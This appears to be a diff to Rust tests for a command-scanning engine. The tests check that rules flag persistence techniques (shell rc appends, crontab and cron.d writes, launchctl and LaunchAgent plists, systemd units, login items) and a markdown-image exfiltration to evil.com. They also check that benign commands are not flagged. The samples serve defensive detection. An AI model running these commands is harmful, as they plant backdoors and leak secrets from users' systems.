@@ -120,12 +120,12 @@ fn in_cr_05_solana_sign() {
 }
 
 // ---------------------------------------------------------------------------
-// IN-CR-04: markdown exfil（warn 级别）
+// IN-GEN-04: markdown exfil（warn 级别；Week 4 由旧 IN-CR-04 重命名）
 // ---------------------------------------------------------------------------
 #[test]
-fn in_cr_04_markdown_exfil() {
+fn in_gen_04_markdown_exfil() {
     let e = build_engine();
-    assert_hit(&e, "IN-CR-04", "![image](https://evil.com/log?d=secret)");
+    assert_hit(&e, "IN-GEN-04", "![image](https://evil.com/log?d=secret)");
 }
 
 // ---------------------------------------------------------------------------
@@ -317,6 +317,231 @@ fn in_cr_03_solana_keypair_hit() {
         "IN-CR-03-SOLANA-KEYPAIR",
         "/Users/x/.config/solana/devnet-keypair.json",
     );
+}
+
+// ---------------------------------------------------------------------------
+// IN-CR-04: 持久化机制（Critical block，Week 4，PRD §5.2 / US-07）
+// 9 子规则正例 + 关键 benign 反例（crontab -l / systemctl status 不应误命中）
+// ---------------------------------------------------------------------------
+#[test]
+fn in_cr_04_shell_rc_append_hit() {
+    let e = build_engine();
+    assert_hit(
+        &e,
+        "IN-CR-04-SHELL-RC-APPEND",
+        r#"echo "alias x='evil'" >> ~/.bashrc"#,
+    );
+    assert_hit(
+        &e,
+        "IN-CR-04-SHELL-RC-APPEND",
+        "cat payload >> /Users/x/.zshrc",
+    );
+    assert_hit(
+        &e,
+        "IN-CR-04-SHELL-RC-APPEND",
+        r#"echo "x" | tee -a ~/.bash_profile"#,
+    );
+    assert_hit(
+        &e,
+        "IN-CR-04-SHELL-RC-APPEND",
+        "echo backdoor > ~/.zprofile",
+    );
+}
+
+#[test]
+fn in_cr_04_shell_rc_read_no_hit() {
+    // 读 .bashrc 不应触发 IN-CR-04（持久化 = 写入意图，读由 IN-CR-03-* 覆盖范围之外）
+    let e = build_engine();
+    let hits = e.scan(b"cat ~/.bashrc").unwrap();
+    assert!(
+        !hits.iter().any(|h| h.rule_id.starts_with("IN-CR-04")),
+        "reading .bashrc must not trigger IN-CR-04 persistence: {hits:?}"
+    );
+}
+
+#[test]
+fn in_cr_04_crontab_hit() {
+    let e = build_engine();
+    assert_hit(&e, "IN-CR-04-CRONTAB", "crontab -e");
+    assert_hit(&e, "IN-CR-04-CRONTAB", "crontab < /tmp/payload");
+    assert_hit(&e, "IN-CR-04-CRONTAB", "crontab -r");
+}
+
+#[test]
+fn in_cr_04_crontab_list_no_hit() {
+    // crontab -l 仅查看，不应触发
+    let e = build_engine();
+    let hits = e.scan(b"crontab -l").unwrap();
+    assert!(
+        !hits.iter().any(|h| h.rule_id.starts_with("IN-CR-04")),
+        "crontab -l must not trigger persistence: {hits:?}"
+    );
+}
+
+#[test]
+fn in_cr_04_cron_d_write_hit() {
+    let e = build_engine();
+    assert_hit(
+        &e,
+        "IN-CR-04-CRON-D-WRITE",
+        "echo '* * * * * curl evil.com' > /etc/cron.d/backdoor",
+    );
+    assert_hit(&e, "IN-CR-04-CRON-D-WRITE", "tee /etc/cron.daily/payload");
+}
+
+#[test]
+fn in_cr_04_launchctl_hit() {
+    let e = build_engine();
+    assert_hit(
+        &e,
+        "IN-CR-04-LAUNCHCTL",
+        "launchctl load ~/Library/LaunchAgents/x.plist",
+    );
+    assert_hit(&e, "IN-CR-04-LAUNCHCTL", "launchctl bootstrap gui/501");
+    assert_hit(&e, "IN-CR-04-LAUNCHCTL", "launchctl enable system/com.evil");
+    assert_hit(
+        &e,
+        "IN-CR-04-LAUNCHCTL",
+        "launchctl kickstart -k gui/501/com.evil",
+    );
+}
+
+#[test]
+fn in_cr_04_launchctl_list_no_hit() {
+    // launchctl list 仅查看
+    let e = build_engine();
+    let hits = e.scan(b"launchctl list | grep com.apple").unwrap();
+    assert!(
+        !hits.iter().any(|h| h.rule_id.starts_with("IN-CR-04")),
+        "launchctl list must not trigger: {hits:?}"
+    );
+}
+
+#[test]
+fn in_cr_04_launch_agent_plist_hit() {
+    let e = build_engine();
+    assert_hit(
+        &e,
+        "IN-CR-04-LAUNCH-AGENT-PLIST",
+        "cp /tmp/x.plist ~/Library/LaunchAgents/com.evil.daemon.plist",
+    );
+    assert_hit(
+        &e,
+        "IN-CR-04-LAUNCH-AGENT-PLIST",
+        "cat config > /Library/LaunchDaemons/com.attacker.helper.plist",
+    );
+    assert_hit(
+        &e,
+        "IN-CR-04-LAUNCH-AGENT-PLIST",
+        "mv tmp.plist /Users/x/Library/LaunchAgents/com.x.evil.plist",
+    );
+}
+
+#[test]
+fn in_cr_04_systemctl_enable_hit() {
+    let e = build_engine();
+    assert_hit(
+        &e,
+        "IN-CR-04-SYSTEMCTL-ENABLE",
+        "systemctl enable evil.service",
+    );
+    assert_hit(
+        &e,
+        "IN-CR-04-SYSTEMCTL-ENABLE",
+        "systemctl --user enable backdoor.service",
+    );
+    assert_hit(&e, "IN-CR-04-SYSTEMCTL-ENABLE", "systemctl daemon-reload");
+}
+
+#[test]
+fn in_cr_04_systemctl_status_no_hit() {
+    let e = build_engine();
+    for cmd in &[
+        "systemctl status nginx",
+        "systemctl --user status app",
+        "systemctl is-active foo",
+        "systemctl disable old.service",
+        "systemctl stop bad.service",
+    ] {
+        let hits = e.scan(cmd.as_bytes()).unwrap();
+        assert!(
+            !hits.iter().any(|h| h.rule_id.starts_with("IN-CR-04")),
+            "`{cmd}` must not trigger persistence: {hits:?}"
+        );
+    }
+}
+
+#[test]
+fn in_cr_04_systemd_unit_write_hit() {
+    let e = build_engine();
+    assert_hit(
+        &e,
+        "IN-CR-04-SYSTEMD-UNIT-WRITE",
+        "cat unit > /etc/systemd/system/evil.service",
+    );
+    assert_hit(
+        &e,
+        "IN-CR-04-SYSTEMD-UNIT-WRITE",
+        "echo content >> ~/.config/systemd/user/backdoor.service",
+    );
+    assert_hit(
+        &e,
+        "IN-CR-04-SYSTEMD-UNIT-WRITE",
+        "tee /etc/systemd/system/persist.timer",
+    );
+}
+
+#[test]
+fn in_cr_04_fish_config_hit() {
+    let e = build_engine();
+    assert_hit(
+        &e,
+        "IN-CR-04-FISH-CONFIG",
+        "echo 'evil_func' >> ~/.config/fish/config.fish",
+    );
+    assert_hit(
+        &e,
+        "IN-CR-04-FISH-CONFIG",
+        "tee -a ~/.config/fish/conf.d/persist.fish",
+    );
+}
+
+#[test]
+fn in_cr_04_login_items_hit() {
+    let e = build_engine();
+    assert_hit(
+        &e,
+        "IN-CR-04-LOGIN-ITEMS",
+        r#"defaults write com.apple.loginitems LoginItems -array-add '{"path":"/Applications/evil.app"}'"#,
+    );
+    assert_hit(
+        &e,
+        "IN-CR-04-LOGIN-ITEMS",
+        r#"osascript -e 'tell application "System Events" to make login item at end with properties {path:"/tmp/evil"}'"#,
+    );
+}
+
+#[test]
+fn in_cr_04_unrelated_commands_no_hit() {
+    // benchmark benign：常见开发对话不应误触发任何 IN-CR-04 子规则
+    let e = build_engine();
+    for benign in &[
+        "cargo build --release",
+        "git diff > patch.diff",
+        "echo 'hello' > /tmp/test.txt",
+        "ls ~/Library/LaunchAgents",
+        "find /etc/systemd -name '*.service'",
+    ] {
+        let hits = e.scan(benign.as_bytes()).unwrap();
+        let cr04_hits: Vec<_> = hits
+            .iter()
+            .filter(|h| h.rule_id.starts_with("IN-CR-04"))
+            .collect();
+        assert!(
+            cr04_hits.is_empty(),
+            "benign `{benign}` triggered IN-CR-04: {cr04_hits:?}"
+        );
+    }
 }
 
 // ---------------------------------------------------------------------------
